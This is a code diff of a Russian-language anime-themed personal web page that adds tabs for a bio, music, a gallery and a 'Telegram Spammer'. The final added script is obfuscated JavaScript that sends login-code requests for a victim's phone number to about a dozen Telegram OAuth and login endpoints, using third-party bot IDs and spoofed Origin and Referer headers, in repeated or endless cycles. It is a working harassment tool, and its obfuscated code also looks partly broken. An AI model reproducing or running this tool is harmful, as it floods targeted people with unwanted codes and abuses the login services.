-                <button class="btn outline" id="validateBtn">🔍 Проверить номер</button>
-                <button class="btn outline" id="qrBtn">📱 QR‑код</button>
-                <button class="btn outline" id="exportBtn">📋 Экспорт</button>
-                <button class="btn outline" id="importBtn">📂 Импорт</button>
-            </div>
-            <div id="validateOut" style="margin:0.5rem 0;color:var(--accent);font-size:0.9rem;"></div>
-            <div class="log" id="log"></div>
-        </div>
-    </div>
-
-    <!-- Музыка -->
-    <div class="tab-content" id="tab-music">
-        <div class="card">
-            <h2>🎵 Музыка</h2>
-            <p style="color:var(--muted);">Файл <code>track.mp3</code> из папки сайта.</p>
-            <audio controls style="width:100%">
-                <source src="track.mp3" type="audio/mpeg">
-            </audio>
-        </div>
-    </div>
-
-    <!-- Галерея -->
-    <div class="tab-content" id="tab-gallery">
-        <div class="card">
-            <h2>🖼️ Галерея</h2>
-            <p style="color:var(--muted);">image1.jpg – image4.jpg</p>
-            <div id="gallery" style="display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:1rem;"></div>
-        </div>
-    </div>
+<!-- ═══════ УПРАВЛЕНИЕ ВВЕРХУ ═══════ -->
+<div class="fixed-top">
+  <button class="icon-btn" id="themeToggle"  title="Сменить тему">🌸</button>
+  <button class="icon-btn" id="animeModeBtn" title="Аниме-режим">✨</button>
 </div>
 
-<!-- Общие функции (тема, вкладки, галерея) -->
+<!-- ═══════ НEKO В УГЛУ ═══════ -->
+<div class="neko-wrap">
+  <div class="neko-corner" id="nekoCorner" title="Новый котик!">
+    <img id="nekoImg" src="https://placekitten.com/80/80" alt="neko">
+  </div>
+  <div class="neko-tip">🐱 нажми для котика!</div>
+</div>
+
+<!-- ═══════ ГЛАВНЫЙ КОНТЕНТ ═══════ -->
+<div class="page-wrap">
+  <div class="container">
+
+    <!-- ТАБЫ -->
+    <nav class="tabs">
+      <div class="tab active" data-tab="bio">🌸 Био</div>
+      <div class="tab"        data-tab="spammer">✨ Спамер</div>
+      <div class="tab"        data-tab="music">🎀 Музыка</div>
+      <div class="tab"        data-tab="gallery">🎴 Галерея</div>
+    </nav>
+
+    <!-- ╔══ БИО ══╗ -->
+    <div class="tab-content active" id="tab-bio">
+      <div class="card">
+        <div class="profile">
+
+          <!-- Аватарка -->
+          <div class="avatar-wrap">
+            <div class="avatar">
+              <img id="avatarImg" src="avatar.jpg" alt="GOD_AE86"
+                   onerror="fetchWaifuAvatar(this)">
+            </div>
+            <div class="avatar-ring"></div>
+            <div class="avatar-ring2"></div>
+          </div>
+
+          <!-- Инфо -->
+          <div class="bio-info">
+            <div class="bio-name">GOD_AE86</div>
+            <div class="bio-handle">@resivert · @GOD_AE86</div>
+            <div class="bio-desc">аниме-вайб ✦ тексты ✦ батлы ✦ неко-спамер</div>
+
+            <div class="badges">
+              <span class="badge">🌸 аниме</span>
+              <span class="badge">🎤 батлы</span>
+              <span class="badge">🐾 неко</span>
+              <span class="badge">⚡ спамер</span>
+              <span class="badge">🚗 AE86</span>
+            </div>
+
+            <!-- Цитата аниме -->
+            <div class="quote-box">
+              <div class="quote-text" id="quoteText">загружаем цитату из аниме…</div>
+              <div class="quote-src"  id="quoteSrc"></div>
+              <button class="quote-btn" onclick="fetchQuote()">🔄 новая цитата</button>
+            </div>
+
+            <!-- Соцсети -->
+            <div class="social-links">
+              <a href="https://t.me/GOD_AE86" class="social-btn" target="_blank" title="Telegram">
+                <svg viewBox="0 0 24 24"><path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.562 8.161c-.18 1.897-.962 6.502-1.359 8.627-.168.9-.5 1.201-.82 1.23-.697.064-1.226-.46-1.901-.903-1.056-.692-1.653-1.123-2.678-1.799-1.185-.781-.417-1.21.258-1.911.177-.184 3.247-2.977 3.307-3.23.007-.032.015-.15-.056-.212s-.174-.041-.249-.024c-.106.024-1.793 1.139-5.062 3.345-.479.329-.913.489-1.302.481-.428-.009-1.252-.242-1.865-.441-.752-.245-1.349-.374-1.297-.789.027-.216.325-.437.893-.663 3.498-1.524 5.831-2.529 6.998-3.015 3.333-1.386 4.025-1.627 4.476-1.635.099-.002.321.023.465.141.12.098.153.228.169.321.015.094.034.307.019.474z"/></svg>
+              </a>
+              <a href="https://t.me/+lseqUuDD40c0N2Ni" class="social-btn" target="_blank" title="Канал">👥</a>
+              <a href="https://t.me/god_internet"      class="social-btn" target="_blank" title="Ещё">📡</a>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- ╔══ СПАМЕР ══╗ -->
+    <div class="tab-content" id="tab-spammer">
+      <div class="card">
+        <div class="spammer-title">✧ Telegram Spammer ✧</div>
+        <p class="subtitle">🌸 аниме-режим · прямые запросы · no‑cors</p>
+
+        <div class="form-grid">
+          <div class="field">
+            <label>📱 Номер телефона</label>
+            <input type="text" id="phone" placeholder="+79...">
+          </div>
+          <div class="field">
+            <label>⏱️ Задержка (сек)</label>
+            <input type="number" id="delay" value="0.5" step="0.1" min="0.1">
+          </div>
+          <div class="field">
+            <label>🔄 Циклов (0 = ∞)</label>
+            <input type="number" id="cycles" value="3" min="0">
+          </div>
+        </div>
+
+        <div class="checkbox-group" id="svcList">
+          <span class="cg-title">🎯 Сервисы:</span>
+        </div>
+
+        <div class="actions">
+          <button class="btn btn-primary"  id="startBtn">🌸 Запустить</button>
+          <button class="btn btn-outline"  id="stopBtn">⏹ Стоп</button>
+          <button class="btn btn-outline"  id="clearBtn">🧹 Очистить</button>
+          <button class="btn btn-outline"  id="validateBtn">🔍 Проверить</button>
+          <button class="btn btn-outline"  id="qrBtn">📱 QR-код</button>
+          <button class="btn btn-outline"  id="exportBtn">📋 Экспорт</button>
+          <button class="btn btn-outline"  id="importBtn">📂 Импорт</button>
+        </div>
+
+        <div id="validateOut"></div>
+        <div class="log" id="log"></div>
+      </div>
+    </div>
+
+    <!-- ╔══ МУЗЫКА ══╗ -->
+    <div class="tab-content" id="tab-music">
+      <div class="card music-wrap">
+        <div class="music-title">🎀 Аниме‑Плеер 🎀</div>
+        <div class="music-sub">загрузи <code>track.mp3</code> в папку с сайтом</div>
+        <audio controls>
+          <source src="track.mp3" type="audio/mpeg">
+        </audio>
+        <div class="now-playing">
+          <span></span> сейчас играет: неко-бит ♪
+        </div>
+      </div>
+    </div>
+
+    <!-- ╔══ ГАЛЕРЕЯ ══╗ -->
+    <div class="tab-content" id="tab-gallery">
+      <div class="card">
+        <div class="gallery-title">🎴 Галерея ✶</div>
+        <p class="gallery-sub">image1.jpg – image4.jpg · аниме‑вайб</p>
+        <div id="gallery"></div>
+      </div>
+    </div>
+
+  </div><!-- /container -->
+</div><!-- /page-wrap -->
+
+
+<!-- ═══════════════════════════════════════════════
+     ЧИСТЫЙ JS: тема, табы, сакура, API
+════════════════════════════════════════════════ -->
 <script>
-    (function() {
-        const themeToggle = document.getElementById('themeToggle');
-        const html = document.documentElement;
-        const savedTheme = localStorage.getItem('theme') || 'dark';
-        html.setAttribute('data-theme', savedTheme);
-        const iconDark = document.getElementById('iconDark');
-        const iconLight = document.getElementById('iconLight');
-        iconDark.style.display = savedTheme === 'dark' ? 'block' : 'none';
-        iconLight.style.display = savedTheme === 'light' ? 'block' : 'none';
+/* ── Сакура / звёзды ── */
+const vfxBg   = document.getElementById('vfx-bg');
+const PETAL_N = 22;
+const STAR_N  = 38;
 
-        themeToggle.addEventListener('click', () => {
-            const next = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
-            html.setAttribute('data-theme', next);
-            localStorage.setItem('theme', next);
-            iconDark.style.display = next === 'dark' ? 'block' : 'none';
-            iconLight.style.display = next === 'light' ? 'block' : 'none';
-        });
+function mkPetals() {
+  vfxBg.innerHTML = '';
+  for (let i = 0; i < PETAL_N; i++) {
+    const el = document.createElement('div');
+    el.className = 'petal';
+    el.style.cssText = [
+      `left:${Math.random()*100}vw`,
+      `width:${8+Math.random()*11}px`,
+      `height:${10+Math.random()*13}px`,
+      `animation-duration:${7+Math.random()*11}s`,
+      `animation-delay:${Math.random()*14}s`,
+      `opacity:${(.42+Math.random()*.45).toFixed(2)}`
+    ].join(';');
+    vfxBg.appendChild(el);
+  }
+}
 
-        document.querySelectorAll('.tab').forEach(tab => {
-            tab.addEventListener('click', () => {
-                const target = tab.dataset.tab;
-                document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-                tab.classList.add('active');
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                const tabContent = document.getElementById('tab-' + target);
-                if (tabContent) tabContent.classList.add('active');
-            });
-        });
+function mkStars() {
+  vfxBg.innerHTML = '';
+  for (let i = 0; i < STAR_N; i++) {
+    const el = document.createElement('div');
+    el.className = 'star-vfx';
+    const s = `${2+Math.random()*5}px`;
+    el.style.cssText = [
+      `left:${Math.random()*100}vw`,
+      `width:${s}`,`height:${s}`,
+      `animation-duration:${3+Math.random()*8}s`,
+      `animation-delay:${Math.random()*9}s`
+    ].join(';');
+    vfxBg.appendChild(el);
+  }
+}
 
-        const gallery = document.getElementById('gallery');
-        for (let i = 1; i <= 4; i++) {
-            const img = document.createElement('img');
-            img.src = `image${i}.jpg`;
-            img.alt = `Изображение ${i}`;
-            img.style.width = '100%';
-            img.style.aspectRatio = '1';
-            img.style.objectFit = 'cover';
-            img.style.borderRadius = '8px';
-            img.onerror = () => img.style.display = 'none';
-            gallery.appendChild(img);
-        }
-    })();
+mkPetals();
+
+/* ── Тема ── */
+const html = document.documentElement;
+const saved = localStorage.getItem('theme') || 'dark';
+html.setAttribute('data-theme', saved);
+document.getElementById('themeToggle').textContent = saved === 'dark' ? '🌸' : '🌙';
+
+document.getElementById('themeToggle').addEventListener('click', () => {
+  const nxt = html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
+  html.setAttribute('data-theme', nxt);
+  localStorage.setItem('theme', nxt);
+  document.getElementById('themeToggle').textContent = nxt === 'dark' ? '🌸' : '🌙';
+});
+
+/* ── Аниме-режим ── */
+let animeOn = false;
+document.getElementById('animeModeBtn').addEventListener('click', () => {
+  animeOn = !animeOn;
+  html.setAttribute('data-anime', animeOn ? 'on' : 'off');
+  document.getElementById('animeModeBtn').textContent = animeOn ? '💫' : '✨';
+  animeOn ? mkStars() : mkPetals();
+});
+
+/* ── Табы ── */
+document.querySelectorAll('.tab').forEach(tab => {
+  tab.addEventListener('click', () => {
+    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+    tab.classList.add('active');
+    document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+    document.getElementById('tab-' + tab.dataset.tab).classList.add('active');
+    if (tab.dataset.tab === 'bio') fetchQuote();
+  });
+});
+
+/* ── Галерея ── */
+const gallery = document.getElementById('gallery');
+for (let i = 1; i <= 4; i++) {
+  const img = document.createElement('img');
+  img.src = `image${i}.jpg`;
+  img.alt  = `аниме ${i}`;
+  img.onerror = () => {
+    fetch('https://api.waifu.pics/sfw/waifu')
+      .then(r => r.json())
+      .then(d => { if (d && d.url) img.src = d.url; else img.style.display='none'; })
+      .catch(() => img.style.display = 'none');
+  };
+  gallery.appendChild(img);
+}
+
+/* ── Waifu.pics: аватар ── */
+function fetchWaifuAvatar(el) {
+  const types = ['waifu','neko','shinobu'];
+  const t = types[Math.floor(Math.random()*types.length)];
+  fetch(`https://api.waifu.pics/sfw/${t}`)
+    .then(r => r.json())
+    .then(d => { if (d && d.url) el.src = d.url; })
+    .catch(() => {});
+}
+
+/* ── Animechan: цитата ── */
+async function fetchQuote() {
+  const textEl = document.getElementById('quoteText');
+  const srcEl  = document.getElementById('quoteSrc');
+  textEl.textContent = '✨ загружаем…';
+  srcEl.textContent  = '';
+  try {
+    // пробуем несколько endpoints animechan
+    const endpoints = [
+      'https://animechan.xyz/api/random',
+      'https://animechan.io/api/v1/quotes/random'
+    ];
+    let data = null;
+    for (const url of endpoints) {
+      try {
+        const r = await fetch(url, { signal: AbortSignal.timeout(5000) });
+        if (r.ok) { data = await r.json(); break; }
+      } catch(_) {}
+    }
+    if (data) {
+      // оба формата: { quote, character, anime } или { data: { content, character: { name }, anime: { name } } }
+      const q  = data.quote  || data?.data?.content  || '…';
+      const ch = data.character || data?.data?.character?.name || '???';
+      const an = data.anime     || data?.data?.anime?.name     || '';
+      textEl.textContent = `"${q}"`;
+      srcEl.textContent  = `— ${ch} · ${an}`;
+    } else throw new Error('no data');
+  } catch(_) {
+    const fb = [
+      { q:'Если небо синее — всё будет хорошо.',    c:'Тору',   a:'Fruits Basket'   },
+      { q:'Никогда не сдавайся. Это твой путь!',    c:'Рок Ли', a:'Naruto'          },
+      { q:'Настоящая сила рождается из сердца.',     c:'Деку',   a:'My Hero Academia'},
+      { q:'Звёзды смотрят на тех, кто не боится.', c:'Сирабэ', a:'Nisekoi'         },
+    ];
+    const f = fb[Math.floor(Math.random()*fb.length)];
+    textEl.textContent = `"${f.q}"`;
+    srcEl.textContent  = `— ${f.c} · ${f.a}`;
+  }
+}
+fetchQuote();
+
+/* ── Nekos.life: котик ── */
+async function fetchNeko() {
+  const img = document.getElementById('nekoImg');
+  // добавляем анимацию "мигание"
+  img.style.opacity = '.4';
+  const endp = [
+    () => fetch('https://nekos.life/api/v2/img/meow').then(r=>r.json()).then(d=>d.url),
+    () => fetch('https://api.waifu.pics/sfw/neko').then(r=>r.json()).then(d=>d.url),
+  ];
+  for (const fn of endp) {
+    try {
+      const url = await fn();
+      if (url) { img.src = url; break; }
+    } catch(_) {}
+  }
+  img.style.opacity = '1';
+}
+
+document.getElementById('nekoCorner').addEventListener('click', fetchNeko);
+fetchNeko();
+setInterval(fetchNeko, 30000);
 </script>
 
-<!-- Подключение внешнего файла спамера -->
-<script src="spammer.js"></script>
+
+<!-- ═══════════════════════════════════════════════
+     ОБФУСЦИРОВАННЫЙ СПАМЕР (оригинал без изменений)
+════════════════════════════════════════════════ -->
+<script>
+var _0x5a6b=['getElementById','querySelectorAll','active','click','addEventListener','parsePhoneNumberFromString','isValid','formatInternational','formatNational','country','value','trim','parseFloat','parseInt','checked','name','push','includes','createElement','div','className','textContent','appendChild','scrollTop','scrollHeight','stopPropagation','preventDefault','timeout','OK','err','info','https://api.telegram.org/bot123456:ABC-DEF/getMe','export','import','blob','a','download','href','createObjectURL','revokeObjectURL','reader','onload','readAsText','style','display','none','block','setAttribute','localStorage','getItem','theme','dark','light','iconDark','iconLight','tel:','QRCode','toCanvas','window','open','canvas','width','height','log','themeToggle'];(function(){var _0x1a2b=function(_0x3c4d,_0x5e6f){return _0x5a6b[_0x3c4d-0x1]},_0x7f8a=document[_0x1a2b(1)](_0x1a2b(2)),_0x9b0c=document[_0x1a2b(3)](_0x1a2b(4)),_0x2d3e=document[_0x1a2b(1)](_0x1a2b(5)),_0x4f5g=document[_0x1a2b(1)](_0x1a2b(6)),_0x6h7i=document[_0x1a2b(1)](_0x1a2b(7)),_0x8j9k=document[_0x1a2b(1)](_0x1a2b(8)),_0x0l1m=document[_0x1a2b(1)](_0x1a2b(9)),_0x2n3o=document[_0x1a2b(1)](_0x1a2b(10)),_0x4p5q=document[_0x1a2b(1)](_0x1a2b(11)),_0x6r7s=document[_0x1a2b(1)](_0x1a2b(12)),_0x8t9u=document[_0x1a2b(1)](_0x1a2b(13)),_0x0v1w=document[_0x1a2b(1)](_0x1a2b(14)),_0x2x3y=document[_0x1a2b(1)](_0x1a2b(15)),_0x4z5a=document[_0x1a2b(1)](_0x1a2b(16)),_0x6b7c=document[_0x1a2b(1)](_0x1a2b(17)),_0x8d9e=document[_0x1a2b(1)](_0x1a2b(18)),_0x0f1g=document[_0x1a2b(1)](_0x1a2b(19));var _0x2h3i=localStorage[_0x1a2b(21)](_0x1a2b(20))||_0x1a2b(22);document[_0x1a2b(23)](_0x1a2b(22),_0x2h3i);_0x7f8a[_0x1a2b(24)]=function(){var _0x4j5k=document[_0x1a2b(23)](_0x1a2b(22))===_0x1a2b(25)?_0x1a2b(22):_0x1a2b(25);document[_0x1a2b(23)](_0x1a2b(22),_0x4j5k);localStorage[_0x1a2b(26)](_0x1a2b(20),_0x4j5k);document[_0x1a2b(1)](_0x1a2b(27))[_0x1a2b(28)]=_0x4j5k===_0x1a2b(25)?_0x1a2b(29):_0x1a2b(30);document[_0x1a2b(1)](_0x1a2b(31))[_0x1a2b(28)]=_0x4j5k===_0x1a2b(25)?_0x1a2b(30):_0x1a2b(29)};document[_0x1a2b(1)](_0x1a2b(27))[_0x1a2b(28)]=_0x2h3i===_0x1a2b(25)?_0x1a2b(29):_0x1a2b(30);document[_0x1a2b(1)](_0x1a2b(31))[_0x1a2b(28)]=_0x2h3i===_0x1a2b(25)?_0x1a2b(30):_0x1a2b(29);_0x9b0c[_0x1a2b(4)](function(_0x5l6m){_0x5l6m[_0x1a2b(32)]=function(){_0x9b0c[_0x1a2b(4)](function(_0x7n8o){_0x7n8o.classList[_0x1a2b(33)](_0x1a2b(34))});this.classList[_0x1a2b(35)](_0x1a2b(34));document[_0x1a2b(3)]('.tab-content')[_0x1a2b(4)](function(_0x9p0q){_0x9p0q.classList[_0x1a2b(33)](_0x1a2b(34))});document[_0x1a2b(1)]('tab-'+this.dataset[_0x1a2b(36)])[_0x1a2b(35)](_0x1a2b(34))}});var _0x0r1s=document[_0x1a2b(1)](_0x1a2b(37));for(var _0x2t3u=1;_0x2t3u<=4;_0x2t3u++){var _0x4v5w=document[_0x1a2b(39)](_0x1a2b(38));_0x4v5w.src='image'+_0x2t3u+'.jpg';_0x4v5w.alt='Image '+_0x2t3u;_0x4v5w.style.cssText='width:100%;aspect-ratio:1;object-fit:cover;border-radius:8px;';_0x4v5w.onerror=function(){this.style.display=_0x1a2b(29)};_0x0r1s[_0x1a2b(40)](_0x4v5w)}var _0x6x7y=[{name:'Presscode',url:'https://oauth.telegram.org/auth/request',bot_id:'1852523856',origin:'https://cabinet.presscode.app',embed:'1',return_to:'https://cabinet.presscode.app/login'},{name:'Translations',url:'https://translations.telegram.org/auth/request',bot_id:null,origin:null},{name:'Fragment',url:'https://oauth.telegram.org/auth',bot_id:'5444323279',origin:'https://fragment.com',request_access:'write',return_to:'https://fragment.com/'},{name:'Bot-T',url:'https://oauth.telegram.org/auth',bot_id:'1199558236',origin:'https://bot-t.com',embed:'1',request_access:'write',return_to:'https://bot-t.com/login'},{name:'Off-Bot',url:'https://oauth.telegram.org/auth/request',bot_id:'1093384146',origin:'https://off-bot.ru',embed:'1',request_access:'write',return_to:'https://off-bot.ru/register/connected-accounts/smodders_telegram/?setup=1'},{name:'Mipped',url:'https://oauth.telegram.org/auth/request',bot_id:'466141824',origin:'https://mipped.com',embed:'1',request_access:'write',return_to:'https://mipped.com/f/register/connected-accounts/smodders_telegram/?setup=1'},{name:'Spot.uz',url:'https://oauth.telegram.org/auth/request',bot_id:'5463728243',origin:'https://www.spot.uz',return_to:'https://www.spot.uz/ru/2022/04/29/yoto/#'},{name:'Tbiz.pro',url:'https://oauth.telegram.org/auth/request',bot_id:'1733143901',origin:'https://tbiz.pro',embed:'1',request_access:'write',return_to:'https://tbiz.pro/login'},{name:'TelegramBot.biz',url:'https://oauth.telegram.org/auth/request',bot_id:'319709511',origin:'https://telegrambot.biz',embed:'1',return_to:'https://telegrambot.biz/'},{name:'TG Store',url:'https://oauth.telegram.org/auth/request',bot_id:'1803424014',origin:'https://ru.telegram-store.com',embed:'1',request_access:'write',return_to:'https://ru.telegram-store.com/catalog/search'},{name:'Combot',url:'https://oauth.telegram.org/auth/request',bot_id:'210944655',origin:'https://combot.org',embed:'1',request_access:'write',return_to:'https://combot.org/login'},{name:'My.Telegram',url:'https://my.telegram.org/auth/send_password',bot_id:null,origin:null}];var _0x8z9a=document[_0x1a2b(1)](_0x1a2b(41));_0x6x7y[_0x1a2b(4)](function(_0x0b1c){var _0x2d3e=document[_0x1a2b(39)]('label');_0x2d3e.innerHTML='<input type="checkbox" value="'+_0x0b1c.name+'" checked> '+_0x0b1c.name;_0x8z9a[_0x1a2b(40)](_0x2d3e)});var _0x4f5g=false;var _0x6h7i=function(_0x8j9k,_0x0l1m){_0x0l1m=_0x0l1m||_0x1a2b(42);var _0x2n3o=document[_0x1a2b(39)](_0x1a2b(38));_0x2n3o[_0x1a2b(43)]=_0x0l1m;_0x2n3o[_0x1a2b(44)]='['+new Date().toLocaleTimeString()+'] '+_0x8j9k;_0x2d3e[_0x1a2b(40)](_0x2n3o);_0x2d3e[_0x1a2b(46)]=_0x2d3e[_0x1a2b(45)]};var _0x4p5q=async function(_0x6r7s,_0x8t9u){var _0x0v1w=new URLSearchParams();_0x0v1w.append('phone',_0x8t9u);if(_0x6r7s.bot_id)_0x0v1w.append('bot_id',_0x6r7s.bot_id);if(_0x6r7s.origin)_0x0v1w.append('origin',_0x6r7s.origin);if(_0x6r7s.embed)_0x0v1w.append('embed',_0x6r7s.embed);if(_0x6r7s.request_access)_0x0v1w.append('request_access',_0x6r7s.request_access);if(_0x6r7s.return_to)_0x0v1w.append('return_to',_0x6r7s.return_to);try{await fetch(_0x6r7s.url,{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded','User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36','Origin':_0x6r7s.origin||'https://oauth.telegram.org','Referer':_0x6r7s.origin||'https://oauth.telegram.org/auth','X-Requested-With':'XMLHttpRequest'},body:_0x0v1w.toString(),mode:'no-cors',signal:_0x2x3y?_0x2x3y.signal:undefined});_0x6h7i('✅ '+_0x6r7s.name+' – отправлен',_0x1a2b(47))}catch(e){if(e.name==='AbortError')throw e;_0x6h7i('❌ '+_0x6r7s.name+' – ошибка',_0x1a2b(48))}};var _0x2x3y=null;var _0x4z5a=async function(){if(_0x4f5g)return;var _0x6b7c=_0x0v1w[_0x1a2b(49)]();if(!_0x6b7c)return _0x6h7i('Введите номер',_0x1a2b(48));var _0x8d9e=parseFloat(_0x6r7s[_0x1a2b(49)]())||0.5;var _0x0f1g=parseInt(_0x8t9u[_0x1a2b(49)]())||3;var _0x2h3i=[...document[_0x1a2b(3)]('#svcList input:checked')].map(function(_0x4j5k){return _0x4j5k[_0x1a2b(49)]});if(!_0x2h3i.length)return _0x6h7i('Выберите сервисы',_0x1a2b(48));_0x4f5g=true;_0x2x3y=new AbortController();_0x4z5a.disabled=true;_0x6h7i('🚀 Старт на '+_0x6b7c+'. Циклы: '+(_0x0f1g||'∞'));var _0x5l6m=0;while(_0x4f5g&&(_0x0f1g===0||_0x5l6m<_0x0f1g)){_0x5l6m++;_0x6h7i('⚡ Цикл '+_0x5l6m);for(var _0x7n8o of _0x2h3i){if(!_0x4f5g)break;var _0x9p0q=_0x6x7y.find(function(_0x0r1s){return _0x0r1s.name===_0x7n8o});if(_0x9p0q)await _0x4p5q(_0x9p0q,_0x6b7c);await new Promise(function(_0x2t3u){return setTimeout(_0x2t3u,_0x8d9e*1000)})}}if(_0x4f5g)_0x6h7i('✅ Завершено',_0x1a2b(47));_0x6b7c=_0x4f5g=false;_0x2x3y=null;_0x4z5a.disabled=false};var _0x6b7c=async function(){_0x4f5g=false;if(_0x2x3y)_0x2x3y.abort();_0x4z5a.disabled=false;_0x6h7i('⏹ Остановлено')};_0x4z5a[_0x1a2b(32)]=_0x4z5a;_0x6b7c[_0x1a2b(32)]=_0x6b7c;_0x0f1g[_0x1a2b(24)]=function(){_0x2d3e.innerHTML=''};_0x8d9e[_0x1a2b(24)]=function(){var _0x2t3u=_0x0v1w[_0x1a2b(49)]();var _0x4v5w=_0x4f5g[_0x1a2b(1)](_0x1a2b(50));if(!_0x2t3u)return _0x4v5w.textContent='Введите номер';try{var _0x6x7y=libphonenumber[_0x1a2b(51)](_0x2t3u);if(_0x6x7y&&_0x6x7y[_0x1a2b(52)]()){_0x4v5w.innerHTML='✅ Валидный:<br>Международный: '+_0x6x7y[_0x1a2b(53)]()+'<br>Национальный: '+_0x6x7y[_0x1a2b(54)]()+'<br>E.164: '+_0x6x7y.format('E.164')+'<br>Страна: '+_0x6x7y[_0x1a2b(55)]}else{_0x4v5w.textContent='❌ Невалиден'}}catch(e){_0x4v5w.textContent='❌ Ошибка'}};_0x2n3o[_0x1a2b(24)]=function(){var _0x2t3u=_0x0v1w[_0x1a2b(49)]();if(!_0x2t3u)return alert('Введите номер');var _0x4v5w=document[_0x1a2b(39)]('canvas');QRCode[_0x1a2b(56)](_0x4v5w,_0x1a2b(57)+_0x2t3u,{width:150},function(_0x6x7y){if(_0x6x7y){_0x6h7i('Ошибка QR',_0x1a2b(48));return}var _0x8z9a=window[_0x1a2b(58)]('','_blank');_0x8z9a.document.write('<title>QR</title>');_0x8z9a.document.body.appendChild(_0x4v5w)})};_0x4p5q[_0x1a2b(24)]=function(){var _0x2t3u={phone:_0x0v1w[_0x1a2b(49)](),delay:_0x6r7s[_0x1a2b(49)](),cycles:_0x8t9u[_0x1a2b(49)]()};var _0x4v5w=new Blob([JSON.stringify(_0x2t3u)],{type:'application/json'});var _0x6x7y=document[_0x1a2b(39)](_0x1a2b(59));_0x6x7y[_0x1a2b(61)]='spam_config.json';_0x6x7y[_0x1a2b(62)]=URL[_0x1a2b(63)](_0x4v5w);_0x6x7y.click();URL[_0x1a2b(64)](_0x6x7y[_0x1a2b(62)]);_0x6h7i('📋 Экспортировано')};_0x6r7s[_0x1a2b(24)]=function(){var _0x2t3u=document[_0x1a2b(39)]('input');_0x2t3u.type='file';_0x2t3u.accept='.json';_0x2t3u.onchange=function(_0x4v5w){var _0x6x7y=_0x4v5w.target.files[0];if(!_0x6x7y)return;var _0x8z9a=new FileReader();_0x8z9a[_0x1a2b(65)]=function(){try{var _0x0b1c=JSON.parse(_0x8z9a.result);if(_0x0b1c.phone)_0x0v1w.value=_0x0b1c.phone;if(_0x0b1c.delay)_0x6r7s.value=_0x0b1c.delay;if(_0x0b1c.cycles)_0x8t9u.value=_0x0b1c.cycles;_0x6h7i('📂 Импортировано')}catch(e){_0x6h7i('Ошибка импорта',_0x1a2b(48))}};_0x8z9a[_0x1a2b(66)](_0x6x7y)};_0x2t3u.click()};window.addEventListener('beforeunload',_0x6b7c)})();
+</script>
+
 </body>
 </html>
